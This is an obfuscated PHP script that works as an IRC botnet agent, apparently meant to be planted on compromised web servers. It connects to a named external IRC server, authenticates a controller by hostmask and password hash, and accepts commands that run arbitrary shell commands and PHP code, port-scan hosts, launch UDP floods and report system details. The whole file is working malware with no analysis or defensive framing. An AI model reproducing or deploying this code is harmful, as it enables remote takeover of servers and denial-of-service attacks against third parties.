<?php set_time_limit(0); error_reporting(0);  class VRJbRRfVnvNnvvzJf {

 var $bzFnZjJvvznbzRZ = array("RZzfnfzbBNrvfRFN"=>"gangbang.angels-agency.nl",
                     "rFrf"=>"23232",
                     "bbRZZ"=>"scary",
                     "RNBnBZ"=>"13",
                     "DTTdP"=>"#wWw#",
                     "Vvv"=>"scan",
                     "RnJJVjjjf"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "fzrJnVFrVB"=>".",
                     "bfbNZfJFFNB"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $VbfvjjNBVvzRRfrfFB = array(); 
 function aYyQqummAaUum() 
 { 
    if(!($this->SCssGSoWg = fsockopen($this->bzFnZjJvvznbzRZ['RZzfnfzbBNrvfRFN'],$this->bzFnZjJvvznbzRZ['rFrf'],$e,$s,30))) 
    $this->aYyQqummAaUum(); 
    $this->QMQAiQMMaUEmIeIIy();
    if(strlen($this->bzFnZjJvvznbzRZ['bbRZZ'])>0) 
    $this->iiAiqim("PASS ".$this->bzFnZjJvvznbzRZ['bbRZZ']);
    $this->AUYmuuMMMIyyIAUE();
    $this->UiMyAiAmIqimaU();
 } function qAiuMmUuYu($lD,$tTT)
 {
    $this->iiAiqim("NOTICE $lD :$tTT");
 } function amYQYeiiMqaM($xhXP) 
 { 
    if(isset($this->VbfvjjNBVvzRRfrfFB[$xhXP])) 
       return 1; 
    else 
       return 0; 
 }function UiMyAiAmIqimaU() 
 { 
    while(!feof($this->SCssGSoWg)) 
    { 
       $this->IEuME = trim(fgets($this->SCssGSoWg,512)); 
       $JbRRjjzvVfbrz = explode(" ",$this->IEuME); 
       if(substr($this->IEuME,0,6)=="PING :") 
       { 
          $this->iiAiqim("PONG :".substr($this->IEuME,6)); 
       } 
       if(isset($JbRRjjzvVfbrz[1]) && $JbRRjjzvVfbrz[1] =="004") 
       { 
          $this->iiAiqim("JOIN ".$this->bzFnZjJvvznbzRZ['DTTdP']." ".$this->bzFnZjJvvznbzRZ['Vvv']."");
          $this->uaEMaY($this->bzFnZjJvvznbzRZ['DTTdP'],$this->bzFnZjJvvznbzRZ['Vvv']);
          $this->AIimMEqyMYeuYiqUIyA();
       } 
       if(isset($JbRRjjzvVfbrz[1]) && $JbRRjjzvVfbrz[1]=="433") 
       { 
          $this->AUYmuuMMMIyyIAUE(); 
       }
       if($this->IEuME != $RBn_ddl) 
       { 
          $jFrnvjnzrrNRZV = array(); 
          $kWO = substr(strstr($this->IEuME," :"),2); 
          $ggcG = explode(" ",$kWO); 
          $wsoOS = explode("!",$JbRRjjzvVfbrz[0]); 
          $kKsSGc = explode("@",$wsoOS[1]); 
          $kKsSGc = $kKsSGc[1]; 
          $wsoOS = substr($wsoOS[0],1); 
          $CocWkck = $JbRRjjzvVfbrz[0]; 
          if($ggcG[0]==$this->wsoOS) 
          { 
           for($p=0;$p<count($ggcG);$p++) 
              $jFrnvjnzrrNRZV[$p] = $ggcG[$p+1]; 
          } 
          else 
          { 
           for($p=0;$p<count($ggcG);$p++) 
              $jFrnvjnzrrNRZV[$p] = $ggcG[$p]; 
          } 
          if(count($JbRRjjzvVfbrz)>2) 
          { 
             switch($JbRRjjzvVfbrz[1]) 
             { 
                case "QUIT": 
                   if($this->amYQYeiiMqaM($CocWkck)) 
                   { 
                      $this->uUuMEyAy($CocWkck); 
                   } 
                break; 
                case "PART": 
                   if($this->amYQYeiiMqaM($CocWkck)) 
                   { 
                      $this->uUuMEyAy($CocWkck); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->amYQYeiiMqaM($CocWkck) && (md5($kKsSGc) == $this->bzFnZjJvvznbzRZ['bfbNZfJFFNB'] || $this->bzFnZjJvvznbzRZ['bfbNZfJFFNB'] == "*")) 
                   { 
                      if(substr($jFrnvjnzrrNRZV[0],0,1)==$this->bzFnZjJvvznbzRZ['fzrJnVFrVB']) 
                      { 
                         switch(substr($jFrnvjnzrrNRZV[0],1)) 
                         { 
                            case "user": 
                              if(md5($jFrnvjnzrrNRZV[1])==$this->bzFnZjJvvznbzRZ['RnJJVjjjf']) 
                              { 
                                 $this->YYMIiumEe($CocWkck);
                              } 
                              else 
                              { 
                                 $this->qAiuMmUuYu($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002Auth\002]: Fout password $wsoOS idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->amYQYeiiMqaM($CocWkck)) 
                   { 
                      if(substr($jFrnvjnzrrNRZV[0],0,1)==$this->bzFnZjJvvznbzRZ['fzrJnVFrVB']) 
                      { 
                         switch(substr($jFrnvjnzrrNRZV[0],1)) 
                         {                            case "passthru": 
                               $gKSCCWGcOKwC = substr(strstr($kWO,$jFrnvjnzrrNRZV[0]),strlen($jFrnvjnzrrNRZV[0])+1); 

                               $OKCWOKkocwKcS = passthru($gKSCCWGcOKwC); 
                               $cKkSgSCokCoggs = explode("\n",$OKCWOKkocwKcS); 
                               for($p=0;$p<count($cKkSgSCokCoggs);$p++) 
                                  if($cKkSgSCokCoggs[$p]!=NULL) 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"      : ".trim($cKkSgSCokCoggs[$p])); 
                            break;                            case "logout": 
                               $this->uUuMEyAy($CocWkck); 
                               $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002Auth\002]\00314 Je bent nu uitgelogt $wsoOS"); 
                            break;                            case "exec": 
                               $gKSCCWGcOKwC = substr(strstr($kWO,$jFrnvjnzrrNRZV[0]),strlen($jFrnvjnzrrNRZV[0])+1); 
                               $OKCWOKkocwKcS = exec($gKSCCWGcOKwC); 
                               $cKkSgSCokCoggs = explode("\n",$OKCWOKkocwKcS); 
                               for($p=0;$p<count($cKkSgSCokCoggs);$p++) 
                                  if($cKkSgSCokCoggs[$p]!=NULL) 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"      : ".trim($cKkSgSCokCoggs[$p])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($kWO,$jFrnvjnzrrNRZV[1]),strlen($jFrnvjnzrrNRZV[1])));
                            break;                            case "die": 
                               $this->iiAiqim("QUIT :die command from $wsoOS");
                               fclose($this->SCssGSoWg); 
                               exit;                            case "info":
                               $this->AIimMEqyMYeuYiqUIyA();
                            break;                            case "restart": 
                               $this->iiAiqim("QUIT :gerestart door $wsoOS");
                               fclose($this->SCssGSoWg); 
                               $this->aYyQqummAaUum(); 
                            break;                            case "system": 
                               $gKSCCWGcOKwC = substr(strstr($kWO,$jFrnvjnzrrNRZV[0]),strlen($jFrnvjnzrrNRZV[0])+1); 
                               $OKCWOKkocwKcS = system($gKSCCWGcOKwC); 
                               $cKkSgSCokCoggs = explode("\n",$OKCWOKkocwKcS); 
                               for($p=0;$p<count($cKkSgSCokCoggs);$p++) 
                                  if($cKkSgSCokCoggs[$p]!=NULL) 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"      : ".trim($cKkSgSCokCoggs[$p])); 
                            break;                            case "pscan": 
                               if(count($jFrnvjnzrrNRZV) > 2) 
                               { 
                                  if(fsockopen($jFrnvjnzrrNRZV[1],$jFrnvjnzrrNRZV[2],$e,$s,15)) 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002pscan\002]: ".$jFrnvjnzrrNRZV[1].":".$jFrnvjnzrrNRZV[2]." is \2open\2"); 
                                  else 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002pscan\002]: ".$jFrnvjnzrrNRZV[1].":".$jFrnvjnzrrNRZV[2]." is \2closed\2"); 
                               } 
                            break;                            case "rndnick": 
                               $this->AUYmuuMMMIyyIAUE(); 
                            break;                            case "udpflood": 
                               if(count($jFrnvjnzrrNRZV)>3) 
                               { 
                                  $this->EuuyIIiqeiyIaaYQUy($jFrnvjnzrrNRZV[1],$jFrnvjnzrrNRZV[2],$jFrnvjnzrrNRZV[3]); 
                               } 
                            break;                            case "sexec":
                               $gKSCCWGcOKwC = substr(strstr($kWO,$jFrnvjnzrrNRZV[0]),strlen($jFrnvjnzrrNRZV[0])+1); 
                               $OKCWOKkocwKcS = shell_exec($gKSCCWGcOKwC); 
                               $cKkSgSCokCoggs = explode("\n",$OKCWOKkocwKcS); 
                               for($p=0;$p<count($cKkSgSCokCoggs);$p++) 
                                  if($cKkSgSCokCoggs[$p]!=NULL) 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"      : ".trim($cKkSgSCokCoggs[$p])); 
                            break;                            case "dns": 
                               if(isset($jFrnvjnzrrNRZV[1])) 
                               { 
                                  $so = explode(".",$jFrnvjnzrrNRZV[1]); 
                                  if(count($so)==4 && is_numeric($so[0]) && is_numeric($so[1]) && is_numeric($so[2]) && is_numeric($so[3])) 
                                  { 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002dns\002]: ".$jFrnvjnzrrNRZV[1]." => ".gethostbyaddr($jFrnvjnzrrNRZV[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002dns\002]: ".$jFrnvjnzrrNRZV[1]." => ".gethostbyname($jFrnvjnzrrNRZV[1])); 
                                  } 
                               } 
                            break;                            case "raw":
                               $this->iiAiqim(strstr($kWO,$jFrnvjnzrrNRZV[1])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $RBn_ddl = $this->IEuME; 
    } 
    $this->aYyQqummAaUum(); 
 } function uUuMEyAy($xhXP) 
 { 
    unset($this->VbfvjjNBVvzRRfrfFB[$xhXP]); 
 } function YYMIiumEe($xhXP) 
 { 
    $this->VbfvjjNBVvzRRfrfFB[$xhXP] = true; 
 } function iiAiqim($tTT) 
 { 
    fwrite($this->SCssGSoWg,"$tTT\r\n"); 
 } function QMQAiQMMaUEmIeIIy() {
  $hdHTtt = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $XpTlHXt = strlen($hdHTtt);
  for($p=0;$p<6;$p++) {
	$ueA .= $hdHTtt[rand(0,$XpTlHXt-1)];
  }
  if(php_uname() == "") { $tTllHPLl = "---"; } else { $tTllHPLl = php_uname(); }
  $this->iiAiqim("USER ".$ueA."-go 127.0.0.1 localhost :".$tTllHPLl."");
 } function EuuyIIiqeiyIaaYQUy($xhXP,$ltpTlllLDd,$QAUA) {
	$this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002UdpFlood Gestart!\002]"); 
	$LxlDTppll = "";
	for($p=0;$p<$ltpTlllLDd;$p++) { $LxlDTppll .= chr(mt_rand(1,256)); }
	$lXPXL = time();
	$p = 0;
	while(time()-$lXPXL < $QAUA) {
		$bX=fsockopen("udp://".$xhXP,mt_rand(0,6000),$e,$s,5);
      	fwrite($bX,$LxlDTppll);
       	fclose($bX);
		$p++;
	}
	$zsH = $p * $ltpTlllLDd;
	$zsH = $zsH / 1048576;
	$XzW = $zsH / $QAUA;
	$XzW = round($XzW);
	$zsH = round($zsH);
	$this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"[\002UdpFlood Afgerond!\002]: $zsH MB verzonden / gemiddelde: $XzW MB/s ");
 } function AIimMEqyMYeuYiqUIyA() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $xXtxPlPDXxt = "\0034ON\003"; } else { $xXtxPlPDXxt = "\0039OFF\003"; }

	$tTllHPLl = php_uname();
	if($tTllHPLl == "") { $nrgwdp = "\00315---\003"; } else { $nrgwdp = "\00315".$tTllHPLl."\003"; }
		 
	 $zfkG = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $hDgCc =  getcwd()."";
	 
	 $TWSo = "\00315".$hDgCc."\003";

	$SsccWCSgOg = fileperms("$hDgCc");

	if (($SsccWCSgOg & 0xC000) == 0xC000) { $KkoOcsWOOGg = 's';
	} elseif (($SsccWCSgOg & 0xA000) == 0xA000) { $KkoOcsWOOGg = 'l';
	} elseif (($SsccWCSgOg & 0x8000) == 0x8000) { $KkoOcsWOOGg = '-';
	} elseif (($SsccWCSgOg & 0x6000) == 0x6000) { $KkoOcsWOOGg = 'b';
	} elseif (($SsccWCSgOg & 0x4000) == 0x4000) { $KkoOcsWOOGg = 'd';
	} elseif (($SsccWCSgOg & 0x2000) == 0x2000) { $KkoOcsWOOGg = 'c';
	} elseif (($SsccWCSgOg & 0x1000) == 0x1000) { $KkoOcsWOOGg = 'p';
	} else { $KkoOcsWOOGg = 'u'; }

	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0100) ? 'r' : '-');
	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0080) ? 'w' : '-');
	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0040) ?	(($SsccWCSgOg & 0x0800) ? 's' : 'x' ) :	(($SsccWCSgOg & 0x0800) ? 'S' : '-'));

	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0020) ? 'r' : '-');
	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0010) ? 'w' : '-');
	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0008) ?	(($SsccWCSgOg & 0x0400) ? 's' : 'x' ) :	(($SsccWCSgOg & 0x0400) ? 'S' : '-'));

	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0004) ? 'r' : '-');
	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0002) ? 'w' : '-');
	$KkoOcsWOOGg .= (($SsccWCSgOg & 0x0001) ?	(($SsccWCSgOg & 0x0200) ? 't' : 'x' ) :	(($SsccWCSgOg & 0x0200) ? 'T' : '-'));
			
	$fRPd = "\00315".$KkoOcsWOOGg."\003";

	$this->eQeuiAQYEQy($this->bzFnZjJvvznbzRZ['DTTdP'],"\00314[SAFE:\003\002 $xXtxPlPDXxt\002\00314]\00315 $zfkG \00314[pwd:]\00315 $TWSo \00314(\003$fRPd\00314) [uname:]\00315 $nrgwdp");
 } function eQeuiAQYEQy($lD,$tTT)
 {
    $this->iiAiqim("PRIVMSG $lD :$tTT");
 } function AUYmuuMMMIyyIAUE() {
  $hdHTtt = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $XpTlHXt = strlen($hdHTtt);
  for($p=0;$p<$this->bzFnZjJvvznbzRZ['RNBnBZ'];$p++) {
	$ueA .= $hdHTtt[rand(0,$XpTlHXt-1)];
  }
  $this->iiAiqim("NICK ".$ueA."");
 } function uaEMaY($DTTdP,$Vvv=NULL) 
 { 
    $this->iiAiqim("JOIN $DTTdP $Vvv"); 
 }}
$CKcgOcSk = new VRJbRRfVnvNnvvzJf;
$CKcgOcSk->aYyQqummAaUum(); ?>